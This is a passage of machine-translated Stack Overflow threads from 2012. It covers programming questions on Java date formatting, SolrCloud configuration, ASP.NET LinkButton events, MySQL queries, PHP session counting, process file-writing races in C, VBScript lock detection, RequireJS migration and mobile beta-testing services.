正如其他人指出的那样，使用（例如） a[`SimpleDateFormat`](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)将实例打印`Date`为字符串。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-06T13:04:29.807

```
SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
Date date = dateFormat.parse("2012-07-27");
System.out.println(dateFormat.format(date)); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-12-26T02:58:48.443

# javascript - 如何让 BiwaScheme 在 JSFiddle 中运行？

> ID：12300653
> 
> 赞同：3
> 
> 时间：2012-09-06T12:57:41.333
> 
> 标签：javascript, scheme

我想尝试让[BiwaScheme](http://www.biwascheme.org/)运行[JSFiddle](http://jsfiddle.net/)。

BiwaScheme 页面声称您需要做的就是：

```
<script src="biwascheme.js">
(display "hello, world!")
</script> 
```

所以我在 JSFiddle 和JavaScript 窗口中添加了资源[http://www.biwascheme.org/repos/release/biwascheme-min.js 。](http://www.biwascheme.org/repos/release/biwascheme-min.js)`(display ...)`

[http://jsfiddle.net/MsjMH/1/](http://jsfiddle.net/MsjMH/1/)

然而，什么也没有发生。我得到的控制台错误是：

```
// Uncaught SyntaxError: Unexpected string 
```

我在这里想念什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-11T15:07:38.333

您可以使用 BiwaScheme.Interpreter 将字符串评估为 Scheme 程序。

例子：

[http://jsfiddle.net/TaEEN/1/](http://jsfiddle.net/TaEEN/1/)

（仅供参考）还有 BiwaScheme-fiddle：[http ://blackboard.biwascheme.org/](http://blackboard.biwascheme.org/)

# solr - SolrCloud ZooKeeper 配置更新

> ID：12300656
> 
> 赞同：10
> 
> 时间：2012-09-06T12:57:45.737
> 
> 标签：solr, apache-zookeeper, solrcloud

如何在 Zoo Keeper 中更新 SolrCloud 的现有配置文件？

我正在使用带有 ZooKeeper 3.3.6 的 Solr4 Beta 版本。我已经更新了一个配置文件，并重新启动了将配置文件上传到 ZooKeeper 的 Solr 实例。但是当我从 SolrCloud 管理控制台检查配置文件时，我看不到更新。我无法理解这是否是 SolrCloud 管理控制台的问题，或者我没有成功将配置文件上传到 ZooKeeper。

有熟悉 ZooKeeper 的人能告诉我如何更新 ZooKeeper 中现有的配置文件，以及如何验证 ZooKeeper 中的更改吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-11T08:54:53.137

Solr 4 附带了一些有用的脚本

```
cloud-scripts/zkcli.sh -cmd upconfig -zkhost 127.0.0.1:2181 -d solr/your_default_collection_with_the_config/conf/ -n config_name_userd_by_all_collections 
```

之后，您必须重新加载核心。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-30T01:26:14.757

SolrCloud 提供了两种将配置文件上传到 ZK 的选项。如果您在开始时有多个内核，请提供选项 -Dbootstrap_conf=true。这将上传所有核心的索引配置文件。如果你只想上传一个核心的配置文件，给两个启动参数-Dbootstrap_confdir和-Dcollection.configName。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-26T20:22:27.710

我在实例中定义了多个核心。您必须通过更改 -Dcollection.configName 参数上传每个配置并每次重新启动 Solr 实例

# c# - 链接按钮的点击功能没有被调用

> ID：12300663
> 
> 赞同：2
> 
> 时间：2012-09-06T12:58:04.553
> 
> 标签：c#, asp.net, linkbutton

我正在 c# 中生成动态链接按钮。单击其中任何一个时，将调用另一个函数，该函数将显示单击了哪个链接按钮。但单击任何链接按钮时都不会调用它。

这就是我生成它的方式。

```
 Int32 i; //create a integer variable
 for (i = 1; i <= 10; i++) // will generate 10 LinkButton
 {
LinkButton lb = new LinkButton(); //create instance of LinkButton
lb.Text = Convert.ToString(i) + ""; //LinkButton Text
lb.ID = Convert.ToString(i); // LinkButton ID’s
lb.CommandArgument = Convert.ToString(i); // LinkButton CommandArgument
lb.CommandName = Convert.ToString(i); // LinkButton CommanName
lb.OnClientClick+= new CommandEventHandler(lb_Command); //Create Handler for it.
//type lb.Command += and press double time Tab Key it will generat the lb_Command() code
 PlaceHolder1.Controls.Add(lb); // Adding the LinkButton in PlaceHolder
 } 
```

这是功能代码。

```
void  lb_Command(object sender, CommandEventArgs e)
{
Label1.Text = e.CommandName; // will display the which Linkbutton clicked
Label1.Text = "aaaa";
//  Response.Redirect(“LnkBtn.aspx?val=” + Label1.Text); // you can also use as QueryString to send values to another page
} 
```

请提供帮助。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:01:39.273

您使用了错误的事件：

ClientClick 只是在 javascript 中触发的客户端事件。

你想要的是[点击事件](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.linkbutton.click.aspx)

[...]

```
lb.Click += new CommandEventHandler(lb_Command); //Create Handler for it. 
```

如果您仍然没有捕捉到该事件，那么您很可能在页面生命周期中的错误时间动态声明了您的 LinkBut​​ton（正如 Eoin Campbell 在他的评论和他的回答中提到的那样）。

他链接到[一篇](http://www.4guysfromrolla.com/articles/092904-1.aspx)关于该主题的非常好的文章，您应该阅读它以了解您为什么不了解该事件。

从您对问题和不同答案的评论来看，您是在 Page_Load 函数中声明按钮。这将不起作用，因为 Page_Load 在页面生命周期中发生得太晚了。

据我了解，现在你有：

```
void Page_Load(object sender, EventArgs e)
{
    if(!Page.IsPostBack)
    {
          Int32 i; //create a integer variable
          for (i = 1; i <= 10; i++) // will generate 10 LinkButton
          {
              LinkButton lb = new LinkButton(); //create instance of LinkButton
              lb.Text = Convert.ToString(i) + ""; //LinkButton Text
              lb.ID = Convert.ToString(i); // LinkButton ID’s
              lb.CommandArgument = Convert.ToString(i); // LinkButton CommandArgument
              lb.CommandName = Convert.ToString(i); // LinkButton CommanName
              lb.OnClientClick+= new CommandEventHandler(lb_Command); //Create Handler for it.
              PlaceHolder1.Controls.Add(lb); // Adding the LinkButton in PlaceHolder
        }
    }
} 
```

你需要摆脱它。相反，使用：

```
void Page_Init(object sender, EventArgs e)
{
    Int32 i; //create a integer variable
    for (i = 1; i <= 10; i++) // will generate 10 LinkButton
    {
         LinkButton lb = new LinkButton(); //create instance of LinkButton
         lb.Text = Convert.ToString(i) + ""; //LinkButton Text
         lb.ID = Convert.ToString(i); // LinkButton ID’s
         lb.CommandArgument = Convert.ToString(i); // LinkButton CommandArgument
         lb.CommandName = Convert.ToString(i); // LinkButton CommanName
         lb.OnClientClick+= new CommandEventHandler(lb_Command); //Create Handler for it.
         PlaceHolder1.Controls.Add(lb); // Adding the LinkButton in PlaceHolder
    }
} 
```

上面链接的文章将解释为什么会这样。这是一个很难掌握但非常重要的概念。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:00:32.750

您正在混合客户端和服务器端代码。OnClientClick 是附加客户端代码的方法。lb_Command 在服务器端运行。

请改用 Click。

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.onclientclick.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.onclientclick.aspx) 与 [http://msdn.microsoft.com/en-us/library/system.web。 ui.webcontrols.button.click.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.click.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:24:26.730

好的。两件事情。正如其他人指出的那样，您应该使用`LinkButton` `Command`or`Click`处理程序。

但是您的第二个问题是您通过尝试仅生成控件来遇到页面生命周期问题

1.  如果（！回发）
2.  在`Page_Load`.

阅读：这是一篇非常好的文章，可以追溯到 .net 1 [http://www.4guysfromrolla.com/articles/092904-1.aspx](http://www.4guysfromrolla.com/articles/092904-1.aspx)

简而言之，您应该每次都创建控件（不仅仅是在初始帖子中），并且您需要`+=`在页面生命周期中尽早连接事件处理程序（该部分），以便在时间之前连接事件PageLifeCycle 尝试触发它们。

覆盖页面的`OnInit`方法并将您的代码移动到那里，无需`if(!Postback)`检查

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:16:56.997

而不是下面的代码

```
lb.OnClientClick+= new CommandEventHandler(lb_Command); //Create Handler for it. 
```

使用以下

```
lb.Command+= new CommandEventHandler(lb_Command); //Create Handler for it. 
```

这是完整的代码。它在我的末端运行。

```
 protected void Page_Load(object sender, EventArgs e)
    {
        Int32 i; //create a integer variable 
        for (i = 1; i <= 10; i++) // will generate 10 LinkButton 
        {
            LinkButton lb = new LinkButton(); //create instance of LinkButton 
            lb.Text = Convert.ToString(i) + "&nbsp;"; //LinkButton Text 
            lb.ID = Convert.ToString(i); // LinkButton ID’s 
            lb.CommandArgument = Convert.ToString(i); // LinkButton CommandArgument 
            lb.CommandName = Convert.ToString(i); // LinkButton CommanName 
            //lb.Click += lb_Click; //Create Handler for it.
            lb.Command += lb_Command;
            //type lb.Command += and press double time Tab Key it will generat the lb_Command() code 
            form1.Controls.Add(lb); // Adding the LinkButton in PlaceHolder 
        } 

    }

    void lb_Command(object sender, CommandEventArgs e)
    {
        Label1.Text = e.CommandName; // will display the which Linkbutton clicked             
    } 
```

谢谢。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-09-06T13:02:10.440

如果链接按钮是从 Button 类继承的，那么您应该附加到 OnClick 事件。?

[http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.buttonbase.click(v=vs.100](http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.buttonbase.click(v=vs.100) )

或者

[http://msdn.microsoft.com/en-us/library/system.windows.forms.control.onclick.aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.onclick.aspx)

# mysql - 在更新子句中使用 select 强制 mysql varchar 字段为上限

> ID：12300668
> 
> 赞同：1
> 
> 时间：2012-09-06T12:58:53.163
> 
> 标签：mysql

尝试更新表，以便将字段的内容更改为大写。

```
UPDATE `schools` SET `postcode` = 
UPPER(
(SELECT `postcode` FROM `schools` WHERE 1)
) 
```

试过这个

```
UPDATE `schools` SET `postcode` = 
UPPER( 
SELECT `postcode` FROM  (SELECT * FROM `schools`) AS x WHERE `postcode`!=''
) WHERE 1 
```

我知道这是可能的，但不能改变这种语法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:00:12.617

试试这个：

```
UPDATE `schools` 
SET `postcode` =UPPER(`postcode`) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:08:55.577

你应该这样尝试

```
UPDATE schools SET postcode =UPPER(SELECT `postcode` FROM `schools` WHERE ur_column = values) 
```

# php - 准确统计活跃用户？（PHP + MySQL）

> ID：12300672
> 
> 赞同：2
> 
> 时间：2012-09-06T12:59:07.617
> 
> 标签：php, mysql, session

基本上，我一直试图准确衡量我的网站有多少活跃用户。我正在跟踪数据库上的会话，并基于 USER_AGENT 进行一些清理以删除机器人/蜘蛛/爬虫（虽然非常基本的东西）。我得到的是非常多的会话，即使在删除相同 IP 的重复会话之后也是如此。事实上，会话数量是谷歌分析和其他用户跟踪系统报告的 10 倍，所以一定是我做错了什么。

这是我跟踪会话的部分代码：

```
//Start session if not active already
if(!isset($_SESSION)){
    session_start();
}

//Determine whether bot or browser
$bots = array(
    'bot',
    'crawler',
    'yahoo',
    'spider',
    'google',
    '$^'
);
$ua = $_SERVER['HTTP_USER_AGENT'];
$uam = preg_match('/'.implode('|', $bots).'/i', $ua);
$uatype = ($uam)?'bot':'browser';

//Add session to DB if new or expired
if ($_SESSION['renew'] < time() || !isset($_SESSION['renew'])) {
    $_SESSION['renew'] = time() + 900; //15 minutes
    $sql = "INSERT INTO " . SESSIONS . " (session_id, user_id,
           renew, user_ip, type, useragent) VALUES ('" . session_id() . "',
           '" . $myuser->get('user_id') . "', " . $_SESSION['renew'] . ",
           '" . $myuser->get('ip') . "', '$uatype', '$ua') 
           ON DUPLICATE KEY
           UPDATE renew = " . $_SESSION['renew'] . ",
           user_id = '" . $myuser->get('user_id') . "'";
    $site_db->query($sql);

    $sql = 'DELETE FROM ' . SESSIONS . '
           WHERE renew < ' . time();
    $site_db->query($sql);
} 
```

因此，我将会话信息存储在数据库中，然后根据需要每 15 分钟更新/过期。

如果我随后在数据库中查询来自具有唯一 IP 地址的浏览器的会话，我会得到大约 10 倍于 JS 系统报告的会话。即使我尝试通过仅计算 IP 地址的前两个八位字节唯一的条目来减少数量，我仍然结束了。

关于我在会话跟踪中可能做错的任何提示？

获取计数的查询如下所示：

```
$sql = "SELECT count(DISTINCT(user_ip) FROM ".SESSIONS." WHERE type = 'browser'"; 
```

需要注意的是，机器人陷阱已经丢弃了大约 66% 的会话。如果我不这样做，我将获得接近 GA 报告的“活跃用户”数量的 40 倍。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:00:41.407

也许存储这些记录，然后做这样的查询：

```
$sql = 'SELECT COUNT(*) FROM ' . SESSIONS . ' WHERE renew BETWEEN ' . $expire-900\. ' AND ' .$expire; 
```

出于性能原因，让 cronjob 执行您的删除操作。例如：删除一小时前过期的每条记录。每隔半小时或其他时间做一次。

# mysql - ON 子句变量顺序 - 优化

> ID：12300674
> 
> 赞同：1
> 
> 时间：2012-09-06T12:59:15.213
> 
> 标签：mysql, sql, performance, join

在下面的 2 个查询中，结果集是相同的，但我想知道由于 ON 子句中比较参数的顺序，速度是否会有所不同。

在第一个查询中它匹配`table1.c1 = table2.c1`，而第二个则相反。

```
SELECT * FROM table1 JOIN table2 ON (table1.c1 = table2.c1) 
```

或者

```
SELECT * FROM table1 JOIN table2 ON (table2.c1 = table1.c1) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:02:40.850

这两个查询完全相同，它们之间没有区别。

使用第一种形式只是一个约定：

```
SELECT * FROM table1 JOIN table2 ON (table1.c1 = table2.c1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:15:42.537

自从 ON 子句中的布尔表达式返回 TRUE 以来，一条记录将被发送到结果集输出。如果其中一张表返回 0 条记录，即使 ON 子句返回 TRUE，结果集也将为空。因此，您希望如何在 ON 子句中编写布尔表达式没有区别。像这样意味着交叉加入！

干杯

```
Select  *
    From    dbo.Person  As  A
    Inner   Join
        dbo.PersonOrder As  B
    On  1       =   1 
```

# c - 多个进程写入同一个文件 (C)

> ID：12300676
> 
> 赞同：4
> 
> 时间：2012-09-06T12:59:19.383
> 
> 标签：c, fork

有一个程序（Ubuntu 12.04 LTS，单核处理器）：

```
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>

int main(){

    mode_t mode = S_IRUSR | S_IWUSR;
    int i = 0, fd, pid;
    unsigned char pi1 = 0x33, pi2 = 0x34;
    if((fd = open("res", O_WRONLY | O_CREAT | O_TRUNC, mode)) < 0){

        perror("open error");
        exit(1);
    }

    if((pid = fork()) < 0){

       perror("fork error");
       exit(1);
    }

    if(pid == 0) {

       if(write(fd, &pi2, 1) != 1){

           perror("write error");
           exit(1);
       }  
    }else{

       if(write(fd, &pi1, 1) != 1){

           perror("write error");
           exit(1);
       }  
    }

    close(fd);
    return 0;
} 
```

这个想法是打开文件进行写入，然后再分叉。两个过程的总和记录的位置。奇怪的是，如果你运行这个程序，它输出到一个文件的“res”不是恒定的：我激怒了然后是34 然后是4 然后是3。问题是为什么会有这样的结论？（毕竟，如果位置是共享的，那么结论必须是 34 或 43。）。

在我的怀疑中，当他找到一个可以写的位置时，这个过程在函数 write 中被打断了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:04:49.373

当您使用 fork() 生成多个进程时，无法确定它们将按什么顺序执行。由操作系统调度程序决定。

因此，让多个进程写入同一个文件是灾难的根源。

关于为什么有时会省略两个数字之一的问题： write 首先写入数据，然后递增文件指针。我认为线程控制可能恰好在那个时刻发生变化，以便第二个线程在文件位置更新之前写入。所以它会覆盖其他进程刚刚写入的数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T15:34:06.023

我多次运行你的程序，结果是“34”或“43”。所以我写了一个shell脚本

```
#!/bin/bash
for i in {1..500}
    do
            ./your_program
            for line in $(cat res) 
            do
                    echo "$line" 
            done
    done 
```

，并运行您的程序 500 次。正如我们所看到的，它有时会得到“3”或“4”（在 500 中乘船 20 次）。我们如何解释这一点？答案是：当我们 fork() 一个子进程时，子进程共享相同的文件描述和文件状态结构（具有当前文件偏移量）。正常情况下，一个进程先得到offset=0，写入第一个字节，offset=1；另一个进程得到offset=1，写入第二个字节。但是有些时候，**如果父进程从文件状态结构中得到offset=0，而子进程同时得到offset=0**，一个进程写入第一个字节，另一个进程覆盖第一个字节。结果将是“3”或“4”（取决于父母先写还是子写）。因为它们都写入文件的第一个字节。

[分叉和偏移，看这个](https://stackoverflow.com/questions/1636055/apuedoes-parent-and-child-share-the-same-file-offset-after-fork?rq=1)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:58:31.330

这就是我认为正在发生的事情。

*   你`open`文件和你`fork`
*   父母先跑（如果孩子先跑，可能会发生类似的事情）
    *   父级写入`3`并退出
    *   父进程是终端的控制进程，因此内核向前台组的所有成员发送 SIGHUP
*   的默认动作`SIGHUP`是终止进程，让孩子默默地死去

一个简单的测试方法是添加睡眠：

```
sleep(5); /* Somewhere in the child, right before you write. */ 
```

您会看到子进程立即死亡：**写入从未执行**。

另一种测试方法是**在 fork 之前**`SIGHUP`忽略, ：

 **```
sigignore(SIGHUP);  /* Define _XOPEN_SOURCE 500 before including signal.h. */
/* You can also use signal(SIGHUP, SIG_IGN); */ 
```

您将看到该过程现在将两个数字写入文件。

* * *

覆盖假设是不可能的。之后`fork`，两个进程共享一个指向系统范围表中相同文件描述符的链接，该**表还包含文件偏移量**。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-06T19:31:28.637

标准说

**{PIPE_BUF} 字节或更少的写入请求不应与来自其他进程在同一管道上进行写入的数据交错。**

链接 - [http://pubs.opengroup.org/onlinepubs/009696699/functions/write.html](http://pubs.opengroup.org/onlinepubs/009696699/functions/write.html)

写入的原子性仅在写入管道的时间小于等于 PIPE_BUF 的情况下得到保证，并且没有为常规文件指定，我们不能假设。

所以在这种情况下，竞争条件正在发生，这会导致某些运行的数据不正确。（在我的系统中，它也在几千次运行之后发生）。

我认为您应该考虑使用互斥锁/信号量/任何其他锁定原语来解决这个问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:04:55.797

你确定你需要 fork() 吗？fork() 创建具有不同内存空间（文件描述符等）的不同进程。也许 pthreads 会适合你？如果使用 pthreads，您将为所有进程共享相同的 fd。但无论如何，你真的应该考虑在你的项目中使用互斥锁。**

# vbscript - 如何确定文件是否使用 VBS 锁定？

> ID：12300678
> 
> 赞同：6
> 
> 时间：2012-09-06T12:59:22.867
> 
> 标签：vbscript, wsh, filesystemobject

我正在编写一个 VB 脚本来更新网络上的一些文件。在开始之前，我想知道是否有任何文件被锁定。我想在实际进行任何更新*之前执行此操作。*

我知道如果在尝试替换文件时文件被锁定，我可以处理该错误，但我真的想知道在开始更新任何文件之前是否有任何文件被锁定。

有什么方法可以查看使用 VBS 锁定文件（除了尝试替换它）？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-07T01:52:19.757

此函数确定是否可以在“写入”模式下访问感兴趣的文件。这与确定文件是否被进程锁定并不完全相同。不过，您可能会发现它适用于您的情况。（至少在出现更好的东西之前。）

此函数将指示当文件被另一个进程锁定时，无法进行“写”访问。但是，它无法将该条件与其他阻止“写”访问的条件区分开来。例如，如果文件设置了只读位或拥有限制性 NTFS 权限，则也无法进行“写入”访问。当进行“写”访问尝试时，所有这些条件都将导致“权限被拒绝”。

另请注意，如果文件被另一个进程锁定，则此函数返回的答案仅在执行该函数时才是可靠的。因此，并发问题是可能的。

如果找到以下任何条件，则会引发异常：“找不到文件”、“找不到路径”或“非法文件名”（“错误的文件名或编号”）。

```
Function IsWriteAccessible(sFilePath)
    ' Strategy: Attempt to open the specified file in 'append' mode.
    ' Does not appear to change the 'modified' date on the file.
    ' Works with binary files as well as text files.

    ' Only 'ForAppending' is needed here. Define these constants
    ' outside of this function if you need them elsewhere in
    ' your source file.
    Const ForReading = 1, ForWriting = 2, ForAppending = 8

    IsWriteAccessible = False

    Dim oFso : Set oFso = CreateObject("Scripting.FileSystemObject")

    On Error Resume Next

    Dim nErr : nErr = 0
    Dim sDesc : sDesc = ""
    Dim oFile : Set oFile = oFso.OpenTextFile(sFilePath, ForAppending)
    If Err.Number = 0 Then
        oFile.Close
        If Err Then
            nErr = Err.Number
            sDesc = Err.Description
        Else
            IsWriteAccessible = True
        End if
    Else
        Select Case Err.Number
            Case 70
                ' Permission denied because:
                ' - file is open by another process
                ' - read-only bit is set on file, *or*
                ' - NTFS Access Control List settings (ACLs) on file
                '   prevents access

            Case Else
                ' 52 - Bad file name or number
                ' 53 - File not found
                ' 76 - Path not found

                nErr = Err.Number
                sDesc = Err.Description
        End Select
    End If

    ' The following two statements are superfluous. The VB6 garbage
    ' collector will free 'oFile' and 'oFso' when this function completes
    ' and they go out of scope. See Eric Lippert's article for more:
    '   http://blogs.msdn.com/b/ericlippert/archive/2004/04/28/when-are-you-required-to-set-objects-to-nothing.aspx

    'Set oFile = Nothing
    'Set oFso = Nothing

    On Error GoTo 0

    If nErr Then
        Err.Raise nErr, , sDesc
    End If
End Function 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-11-20T11:12:47.767

下面的脚本尝试写入文件 30 秒，然后放弃。当我们所有的用户都必须点击一个脚本时，我需要这个。可能有多个用户尝试同时写入。OpenCSV() 尝试以 1 秒的延迟打开文件 30 次。

```
 Const ForAppending = 8

  currentDate = Year(Now) & "-" & Month(Now) & "-" & Day(Now) & " " & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now)
  filepath = "\\network\path\file.csv"
  Set oCSV = OpenCSV( filepath ) 
  oCSV.WriteLine( currentDate )
  oCSV.Close

  Function OpenCSV( path )
    Set oFS = CreateObject( "Scripting.FileSystemObject" )
    For i = 0 To 30
      On Error Resume Next
      Set oFile = oFS.OpenTextFile( path, ForAppending, True )
      If Not Err.Number = 70 Then
        Set OpenCSV = oFile
        Exit For
      End If
      On Error Goto 0
      Wscript.Sleep 1000
    Next
    Set oFS = Nothing
    Set oFile = Nothing
    If Err.Number = 70 Then
      MsgBox "File " & filepath & " is locked and timeout was exceeded.", vbCritical
      WScript.Quit
    End If
  End Function 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-03-02T14:06:04.200

或者，更简单地说：

假设您的 VBS 中已经有一个名为**FileName**的变量，其中包含您要测试的完整文件路径：

```
Dim oFso, oFile
Set oFso = CreateObject("Scripting.FileSystemObject")
Set oFile = oFso.OpenTextFile(FileName, 8, True)
If Err.Number = 0 Then oFile.Close 
```

第 3 行尝试在启用附加权限的情况下打开要测试的文件。例如，它试图用写锁打开文件。

如果使用写锁打开文件会产生错误，那么您的 VBS 将在第三行出错并且不会继续。那时，您从调用 VBS 的任何位置进行的错误处理都应该启动。如果您无法获得写锁定，则错误消息将是“Permission Denied”。

如果使用锁打开文件*不会*导致错误，则第 4 行将再次关闭它。您现在可以打开文件或对它做任何您想做的事情，确信它没有写锁。

# php - cakephp / php Mysql 复杂查询仪表盘统计

> ID：12300682
> 
> 赞同：0
> 
> 时间：2012-09-06T12:59:43.750
> 
> 标签：php, statistics, dashboard

我有以下 mysql 数据库表：

`cities`

`states`

`countries`

和

`members`

`samajs`（国际上的一群人）

我想为我的`dashboard`页面创建一个查询，该查询将具有以下结果：

```
Country   Members Samajs Total   (table header)

Country1    7      5     16      (country row with total members, samajs and total count)

  state1    5      2     7       (state row with total members, samajs and total count)

    city1   3      1     4       (all cities in that state, city row with total members, samajs and total count)

    city2   2      0     2         

  state2    2      1     3

Country2    3      2     5      (country row with total members, samajs and total count)

 ...and vice versa.... 
```

在这里，`members`表将`country_id, state_id and city_id`作为外键

`samajs`表也​​将 `country_id, state_id and city_id`作为外键

任何想法，相同的查询是什么？

谢谢 ！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:03:53.757

最后，进行了一次查询，在以下帮助下，我得到了预期的`union`结果`subqueries`：

```
SELECT country_id, state_id, city_id, country, membercount, samajcount FROM
        (

        SELECT con.country_id, -1 as state_id, -2 as city_id, con.country, 
        (SELECT COUNT(member_id) FROM members WHERE country_id = con.country_id) as membercount, 
        (SELECT COUNT(samaj_id) FROM samajs WHERE country_id = con.country_id) as samajcount
        FROM countries as con
        group by con.country  

        UNION 

        SELECT s.country_id, s.state_id, -2 as city_id, s.state as country, 
        (SELECT COUNT(member_id) FROM members WHERE state_id = s.state_id) as membercount, 
        (SELECT COUNT(samaj_id) FROM samajs WHERE state_id = s.state_id) as samajcount
        FROM states as s
        group by s.state  

        UNION

        SELECT c.country_id, c.state_id, c.city_id, c.city as country, 
        (SELECT COUNT(member_id) FROM members WHERE city_id = c.city_id) as membercount, 
        (SELECT COUNT(samaj_id) FROM samajs WHERE city_id = c.city_id) as samajcount
        FROM cities as c
        group by c.city  

        ) COUNTRY  

        order by country_id, state_id, city_id, country ; 
```

希望它可以帮助某人满足他们的要求！

谢谢

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:21:28.620

我准备了一个查询更改是根据您的表字段：

```
// for country based 
SELECT  
countries.name AS countryName,
(SELECT
count('x') FROM members WHERE members.country_id = countries.id) as totalMembers,
COUNT(samajs.country_id) as totalSamajs
FROM 
    `countries`
INNER JOIN samajs ON samajs.country_id = countries.id
GROUP BY 
    countries.name
ORDER BY
   totalMembers DESC

// state based result

    SELECT  
states.name AS stateName,
(SELECT
count('x') FROM members WHERE members.state_id = states.id) as totalMembers,
COUNT(samajs.state_id) as totalSamajs
FROM 
    `states`
INNER JOIN samajs ON samajs.state_id = states.id
GROUP BY 
    states.name
ORDER BY
   totalMembers DESC

//city based result

SELECT  
cities.name AS cityName,
(SELECT
count('x') FROM members WHERE members.city_id = cities.id) as totalMembers,
COUNT(samajs.city_id) as totalSamajs
FROM 
    `cities`
INNER JOIN samajs ON samajs.city_id = cities.id
GROUP BY 
    cities.name
ORDER BY
   totalMembers DESC 
```

并且根据 cakephp 方法，您可以遵循以下问题：
[Order data based on count of related table data](https://stackoverflow.com/questions/12297743/order-data-based-on-count-of-related-table-data/12298086)

# javascript - 将 javascript 应用程序迁移到使用 AMD 的提示（例如 requirejs）

> ID：12300683
> 
> 赞同：6
> 
> 时间：2012-09-06T12:59:44.660
> 
> 标签：javascript, requirejs

我有一个 javascript 项目，大多数模块都使用一些第三方库作为“全局”依赖项（特别是 jquery 和 jquery 插件）

我想“清理”项目（将所有库表示为 requirejs 依赖项。），但是在我的情况下这是一项大任务（大量文件，大量第三方库）。

我怎样才能使迁移更容易/更快？

*   我可以通过将第三方库包装在仅加载它们的模块中来使用 amd 依赖项“伪造”（使用命令！插件？）
*   将加载第三方库的模块作为模块和直接使用全局的模块混合是否安全？
*   如果我想使事情自动化，是否可以使用任何工具来“解析”r​​equirejs 模块来告诉我是否使用了特定符号？

编辑：我最后一个问题的意思是“是否可以自动重写我的 js 文件，以便明确地导入依赖项而不是依赖于浏览器全局变量？”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T08:32:16.963

> 我可以通过将第三方库包装在仅加载它们的模块中来使用 amd 依赖项“伪造”吗

是的，你可以，RequireJS 有一个专门为此设计的**shim配置。**

看看这篇文章，它将帮助您使用 RequireJS [http://www.stefanprodan.eu/2012/09/intro-requirejs-for-asp-net-mvc/组织您的 JavaScript 代码](http://www.stefanprodan.eu/2012/09/intro-requirejs-for-asp-net-mvc/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T06:34:23.927

关于在 AMD 模块中包装第三方代码的需要，我有一个[类似的问题。](https://stackoverflow.com/questions/11384629/pattern-for-backbone-app-using-requirejs)我的结论是，在我的情况下（大型 Backbone 应用程序）没有任何好处。因此，您应该问自己是否真的需要为每个 AMD 导入 jquery。这将在您每次导入 jquery 的模块中结束，这是很多容易出错的样板代码。

所以简而言之，将 AMD 用于在任何情况下都会使用的代码是没有意义的。

# android - 适用于 iOS + Android + BlackBerry 的 testflight 等服务

> ID：12300684
> 
> 赞同：13
> 
> 时间：2012-09-06T12:59:46.173
> 
> 标签：android, ios, blackberry, testflight, over-the-air

我有一个使用[PhoneGap](http://en.wikipedia.org/wiki/PhoneGap)构建的应用程序，我想通过优雅的界面将它发送给我的客户并获得反馈。我之前在 iOS 上使用过 testflight，但它不适用于 Android 或 BlackBerry。

我在我的服务器上安装了 HockeyKit。HockeyKit 的 alpha 版本支持 Android，但有很多文件需要上传和组织。

是否有任何解决方案可以处理所有三个平台——iOS、Android 和黑莓？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-19T14:06:22.943

[AppBlade](http://appblade.com)支持您正在寻找的所有三个平台。老实说，我只在 Android 上使用过它们，但它的效果很好。当我遇到问题时，他们的工程师也给予了我很大的支持，他们似乎对功能请求也相当敏感。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-13T12:52:44.033

[背包](http://knappsack.com)听起来可能符合要求。它是一个移动应用程序管理平台，允许无线安装您的应用程序，并对有权访问所述应用程序的用户进行细粒度控制。它是开源的，因此您可以将其安装在您自己的服务器上，但也有一个免费层可能适合您的需求。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-22T13:52:53.210

可以试试[HockeyApp](http://hockeyapp.net/)，但它不适用于黑莓。这是最好的模拟试飞。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-03T13:42:56.780

现在是 2015 年初，上面列出的解决方案要么不再存在，要么如果您拥有多个应用程序/测试人员则不是免费的。

我发现的最好的 TestFlightApp.com 替代品是 Crashlytics。它们支持 iOS 和 Android（没有黑莓）。

